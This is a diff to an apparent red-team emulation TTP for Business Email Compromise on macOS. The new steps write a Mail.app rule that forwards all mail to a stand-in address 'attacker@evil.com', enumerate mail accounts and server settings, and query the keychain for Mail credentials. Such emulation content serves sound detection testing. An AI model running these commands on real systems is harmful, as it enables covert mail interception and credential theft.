@@ -5,9 +5,10 @@ name: Business Email Compromise
 authors:
   - mbhatt
 description: |
-  Demonstrates Business Email Compromise (BEC) attack execution where attackers
-  compromise or spoof executive emails to conduct fraud. Includes account takeover,
-  email manipulation, and fraudulent transaction authorization.
+  Performs Business Email Compromise (BEC) techniques by reading Mail.app
+  configuration, creating mail forwarding rules via defaults write, enumerating
+  mail account configurations from ~/Library/Mail, and inspecting mail server
+  settings to establish persistent email surveillance.
 
 mitre:
   tactics:
@@ -22,101 +23,115 @@ requirements:
     - os: darwin
 
 args:
-  - name: compromised_email
-    description: "Email account being compromised/spoofed"
+  - name: forward_to_address
+    description: "Email address to forward intercepted emails to"
     type: string
-    default: "cfo@company.com"
-  - name: compromised_person_name
-    description: "Name of executive whose email is compromised"
-    type: string
-    default: "Patricia Anderson, Chief Financial Officer"
-  - name: compromised_department
-    description: "Department being impersonated"
-    type: string
-    default: "Finance/Accounting"
-  - name: target_payment_processor
-    description: "Target responsible for processing payments"
-    type: string
-    default: "accounts_payable@company.com"
+    default: "attacker@evil.com"
 
 steps:
-  - name: create_account_compromise_scenario
-    description: Create account compromise scenario and timeline
+  - name: read_mail_app_configuration
+    description: Read current Mail.app rule configuration using defaults read
     inline: |
-      mkdir -p /tmp/bec_attack
-      cat > /tmp/bec_attack/compromise_timeline.txt << 'TIMELINEEOF'
-      BUSINESS EMAIL COMPROMISE TIMELINE
-      ATTACK OBJECTIVE: Fraudulent wire transfer and vendor redirection
-      COMPROMISED ACCOUNT: {{ compromised_email }}
-      EXECUTIVE: {{ compromised_person_name }}
-      DAY 1: Initial account compromise via phishing
-      DAY 2: Email account fortification with forwarding rules
-      DAY 3: Surveillance and intelligence gathering
-      DAY 4: Initial test transaction
-      DAY 5-7: Larger fraudulent transactions
-      DAY 8: Discovery and response
-      TIMELINEEOF
-      echo "Created compromise timeline"
+      mkdir -p /tmp/ttp_bec
+      echo "[+] Reading Mail.app preferences..."
+      defaults read com.apple.mail 2>/dev/null > /tmp/ttp_bec/mail_prefs.txt || echo "No Mail.app preferences found"
+      echo "[+] Existing mail rules:"
+      defaults read com.apple.mail SortOrder 2>/dev/null || echo "  No sort rules configured"
+      echo ""
+      echo "[+] Mail signature settings:"
+      defaults read com.apple.mail SignatureIsRich 2>/dev/null || echo "  No signature settings found"
+      echo ""
+      echo "[+] Mail account count:"
+      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -c "AccountName" || echo "  0 accounts found"
+
+  - name: create_mail_forwarding_rule
+    description: Create a mail forwarding rule using defaults write
+    inline: |
+      echo "[+] Creating mail forwarding rule to {{ .Args.forward_to_address }}..."
+      RULE_PLIST="/tmp/ttp_bec/bec_rule.plist"
+      cat > "${RULE_PLIST}" << PLISTEOF
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+        <key>RuleName</key>
+        <string>Auto-Forward</string>
+        <key>RuleAction</key>
+        <string>forward</string>
+        <key>ForwardTo</key>
+        <string>{{ .Args.forward_to_address }}</string>
+        <key>Criteria</key>
+        <array>
+          <dict>
+            <key>CriterionType</key>
+            <string>AnyMessage</string>
+          </dict>
+        </array>
+        <key>Enabled</key>
+        <true/>
+      </dict>
+      </plist>
+      PLISTEOF
+      defaults write com.apple.mail TTP-BEC-ForwardRule -dict \
+        RuleName "Auto-Forward" \
+        ForwardTo "{{ .Args.forward_to_address }}" \
+        RuleAction "forward" \
+        Enabled -bool true
+      echo "[+] Mail forwarding rule created"
+      echo "[+] Verifying rule was written:"
+      defaults read com.apple.mail TTP-BEC-ForwardRule
+
+  - name: enumerate_mail_accounts
+    description: Check for existing email account configurations in ~/Library/Mail
+    inline: |
+      echo "[+] Enumerating mail account directories..."
+      if [ -d "${HOME}/Library/Mail" ]; then
+        echo "[+] Mail directory structure:"
+        ls -la "${HOME}/Library/Mail/" 2>/dev/null | head -20
+        echo ""
+        echo "[+] Mail account directories (V-series):"
+        find "${HOME}/Library/Mail" -maxdepth 2 -name "*.mbox" -type d 2>/dev/null | head -10 || echo "  No mailbox directories found"
+        echo ""
+        echo "[+] Account info plists:"
+        find "${HOME}/Library/Mail" -maxdepth 3 -name "AccountInfo.plist" 2>/dev/null | head -5 || echo "  No account info plists found"
+      else
+        echo "[-] ~/Library/Mail directory does not exist"
+      fi
+      echo ""
+      echo "[+] Internet Accounts configuration:"
+      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -E "(AccountName|AccountType|Hostname|Username)" | head -20 || echo "  No mail accounts found in preferences"
+
+  - name: inspect_mail_server_settings
+    description: Enumerate mail accounts and their server settings
+    inline: |
+      echo "[+] Mail server configuration details:"
+      defaults read com.apple.mail MailAccounts 2>/dev/null | grep -E "(Hostname|PortNumber|SSLEnabled|AuthScheme|ServerPath)" | head -20 || echo "  No server settings found"
+      echo ""
+      echo "[+] Internet accounts (system-level):"
+      defaults read MobileMeAccounts 2>/dev/null | grep -E "(AccountID|AccountDescription)" | head -10 || echo "  No MobileMe/iCloud accounts configured"
+      echo ""
+      echo "[+] Checking for mail-related keychains:"
+      security find-generic-password -s "Mail" 2>/dev/null | head -10 || echo "  No Mail keychain entries found (or access denied)"
+
+  - name: verify_forwarding_rule_created
+    description: Verify the forwarding rule was created and report findings
+    inline: |
+      echo "[+] Verification of BEC forwarding rule:"
+      RULE_EXISTS=$(defaults read com.apple.mail TTP-BEC-ForwardRule 2>/dev/null)
+      if [ -n "${RULE_EXISTS}" ]; then
+        echo "[+] PASS: Forwarding rule exists in Mail.app preferences"
+        echo "${RULE_EXISTS}"
+      else
+        echo "[-] FAIL: Forwarding rule not found"
+      fi
+      echo ""
+      echo "[+] Summary of enumerated data saved to /tmp/ttp_bec/"
+      ls -la /tmp/ttp_bec/
     cleanup:
       inline: |
-        rm -rf /tmp/bec_attack
-
-  - name: create_bec_email_templates
-    description: Create BEC email templates for fraud
-    inline: |
-      cat > /tmp/bec_attack/bec_email_templates.txt << 'EMAILEOF'
-      BUSINESS EMAIL COMPROMISE EMAIL TEMPLATES
-      TEMPLATE 1: URGENT PAYMENT REQUEST
-      From: {{ compromised_email }}
-      To: {{ target_payment_processor }}
-      Subject: URGENT - Vendor Payment Required Today
-      TEMPLATE 2: VENDOR ACCOUNT CHANGE
-      TEMPLATE 3: EMERGENCY TRANSFER
-      TEMPLATE 4: AUTHORIZATION OVERRIDE
-      EMAILEOF
-      echo "Created BEC email templates"
-
-  - name: create_post_compromise_actions
-    description: Create post-compromise actions documentation
-    inline: |
-      cat > /tmp/bec_attack/post_compromise_actions.txt << 'ACTIONSEOF'
-      POST-COMPROMISE PERSISTENCE AND EXPLOITATION
-      PHASE 1: Account Fortification
-      PHASE 2: Intelligence Gathering
-      PHASE 3: Fraudulent Transaction Execution
-      PHASE 4: Covering Tracks
-      ACTIONSEOF
-      echo "Created post-compromise actions"
-
-  - name: create_incident_response_log
-    description: Create incident response log
-    inline: |
-      mkdir -p /tmp/bec_logs
-      timestamp=$(date +%Y%m%d_%H%M%S)
-      cat > /tmp/bec_logs/incident_${timestamp}.log << 'LOGEOF'
-      BUSINESS EMAIL COMPROMISE INCIDENT LOG
-      Target Account: {{ compromised_email }}
-      Target Executive: {{ compromised_person_name }}
-      Attack Type: Account Compromise and Fraud
-      LOGEOF
-    cleanup:
-      inline: |
-        rm -rf /tmp/bec_logs
-
-  - name: verify_bec_timeline_created
-    description: Verify BEC timeline was created
-    inline: |
-      test -f /tmp/bec_attack/compromise_timeline.txt && echo "PASS: BEC timeline created"
-
-  - name: verify_email_templates_created
-    description: Verify email templates were created
-    inline: |
-      test -f /tmp/bec_attack/bec_email_templates.txt && echo "PASS: Email templates created"
-
-  - name: verify_post_compromise_actions_documented
-    description: Verify post-compromise actions were documented
-    inline: |
-      test -f /tmp/bec_attack/post_compromise_actions.txt && echo "PASS: Post-compromise actions documented"
+        defaults delete com.apple.mail TTP-BEC-ForwardRule 2>/dev/null || true
+        rm -rf /tmp/ttp_bec
+        echo "[+] Cleanup: Forwarding rule removed and temp files deleted"
 
 tests:
   - name: business_email_compromise_test
